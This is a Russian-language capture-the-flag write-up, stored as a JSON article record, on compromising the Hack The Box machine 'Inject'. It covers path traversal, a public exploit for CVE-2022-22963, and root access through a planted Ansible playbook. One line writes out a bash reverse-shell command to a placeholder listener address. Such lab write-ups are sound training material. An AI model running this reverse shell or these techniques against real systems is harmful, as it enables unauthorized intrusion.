{
    "article_id": "726220",
    "article_name": "Writeup HTB machine «Inject» [easy]",
    "content": "Дисклеймер\nПривет дорогой хтбшник) Перед прочтением статьи хотел попросить не судить мой разбор строго, так как это первая моя статья посвященная разбору машин HTB.\nВсем желаю хорошего прочтения)  \nПолучение флага user.txt\nПри сканировании видим открытый 8080 порт\nПерейдем на сайт по открытому 8080 порту\nКнопки регистрации, авторизации, а также \"Start Now\" не рабочие\nНас интересует вкладка \"Upload\"\nПерейдя по ней мы видим страницу следущего содержания\nОна позволяет загружать фалы только с расширением, которые могут быть у изображений\nЗагрузим какое-нибудь изображение и посмотрим, что из этого выйдет\nЗагрузив изображение он предлагает нам на него посмотреть перейдя по ссылке\nПерейдя по указанной ссылке мы видим загруженное нами ранее изображение\nНо в данном случае нас интресует непосредственно сам ориджин\nИз него видно, что для получения изображения мы должны указать его название в параметре img на вкладке show_image\nПерейдем в burp и попробуем атаку path traversal\nПовезло, нагрузку получилось перебрать руками, так как оказалась очень простой\nВидим логины пользователей\nПосмотрев их домашние директории видим, что флаг user.txt находится в домашней директории пользователя phil\nБольшего через path traversal мы не добьемся\nНужно узнать что за сервис висит на данном порту\nПолучим его баннер\nПоискав эксплоит в интернете находим рабочий PoC для CVE-2022-22963\nПроверяем PoC и видим, что получилось создать файл в директории /tmp\nСоздадим sh файл для получения шелла через netcat\nДоставляем файл через http python сервер\nФайл улетел на сервер\nОткрываем netcat лисенер на нашем хосте\nДадим права на выполнение скрипта\nЗапускаем скрипт и получаем шелл\nПосмотрев, что у него в директории, видим скрытую папку .m2\nВ ней лежит файл setting.xml\nПрочитав его видим пароль от пользователя phil\nПолучаем шелл пользователя phil\nИ забираем флаг\nПолучение флага root.txt\nПерейдем в папку с файлом который подгружается рутовым процессом\nПоискав немного в интернете находим, что можно подменить данный файл для повышения привелегий\nДля этого создаем у себя на хосте файл такого содержания\nПодгружаем его командой curl, через пользователя phil, в директорию /opt/automation/tasks/ и даем ему любое название, но с расширением .yml\nПосле открывем netcat лисенер на нашей машине \nОт пользователя phil создаем sh файл следующей командой\necho '/bin/bash -i >& /dev/tcp/адрес_лисенера/3434 0>&1' > /tmp/root.sh\nЗатем необходимо выволнить перезагрузку ansible-playbook с указанием нашего файла\nУра! Мы получили root права. С радостью забираем флаг и бежим его сдавать.\nВсем желаю больше побед и успехов в решении подобных заданий!\n \n ",
    "tags": [
        "ctf",
        "htb",
        "pentest",
        "pentesting"
    ]
}